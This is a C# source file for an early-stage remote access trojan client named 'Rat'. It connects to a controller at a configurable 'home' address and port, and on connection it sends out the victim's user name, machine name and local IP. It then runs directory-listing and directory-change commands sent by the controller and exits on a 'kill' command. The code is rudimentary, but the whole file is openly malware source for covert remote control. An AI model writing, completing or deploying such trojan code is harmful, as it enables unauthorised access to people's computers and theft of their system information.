using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

using da_box;

/** [ ] Messaage log query
 *  [ ] Connection retries
 */

namespace da_rat
{
    class Rat
    {
        private static ManualResetEvent _connectDone = new ManualResetEvent(false);

        private static byte[] _buffer = new byte[2048];
        private static Socket _clientSocket =
            new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        private static Box ToolBox = new Box();


        private static void puts(string text)
        {
            Console.WriteLine(text);
            Console.Write("> ");
        }


        static void Main(string[] args)
        {
            Console.Title = "Rat";

            SetupClient();
            SendLoop();

            Console.WriteLine("Exiting...");
            Console.ReadLine();
        }

        private static void SetupClient(string home = "127.0.0.1", int port = 1337)
        {
            _clientSocket.BeginConnect(IPAddress.Parse(home), port
                , new AsyncCallback(ConnectCallback), _clientSocket);

            _connectDone.WaitOne();
        }

        private static void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                Socket client = (Socket)AR.AsyncState;
                client.EndConnect(AR);

                Console.WriteLine("Socket connected to {0}",
                    client.RemoteEndPoint.ToString());

                SendMessage(GetSysInfo());

                client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), client);

                _connectDone.Set();
            } catch (Exception)
            {
                puts("\n\nRetrying to connect...");
                Thread.Sleep(TimeSpan.FromSeconds(1));
            }
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;

            try
            {
                int received = socket.EndReceive(AR);
                string response = "";

                byte[] dataBuf = new byte[received];
                Array.Copy(_buffer, dataBuf, received);


                string text = Encoding.ASCII.GetString(dataBuf);
                if (text == "kill")
                {
                    Console.WriteLine("Received `kill` command from home.");
                    Environment.Exit(0);
                }


                string[] textArr = text.Split();
                if  (textArr[0] == "dir")
                    response = ToolBox.Dir();
                else if (textArr[0] == "cd")
                    if (!ToolBox.Cd(textArr[1]))    response = "Invalid dir given...";

                SendMessage(response);
            }
            catch (SocketException) { puts("Server disconnected..."); }
        }

        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

        private static void SendMessage(string message)
        {
            byte[] buffer = Encoding.ASCII.GetBytes(message);
            _clientSocket.Send(buffer);

            _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                new AsyncCallback(ReceiveCallback), _clientSocket);
        }

        private static string GetSysInfo()
        {
            string localIp = String.Empty;

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    localIp = ip.ToString();
            }
            if (String.IsNullOrEmpty(localIp)) localIp = "NoAddrFound";

            /*> INFO user@machine localIp */
            return "INFO " + System.Environment.UserName + "@" +
                System.Environment.MachineName + " " + localIp;
        }

        private static void SendLoop()
        {
            while(true)
            {
                Console.Write("> ");
                string req = Console.ReadLine().Trim();

                if (req == "break" || req == "exit")
                    break;

                SendMessage(req);
            }
        }
    }
}
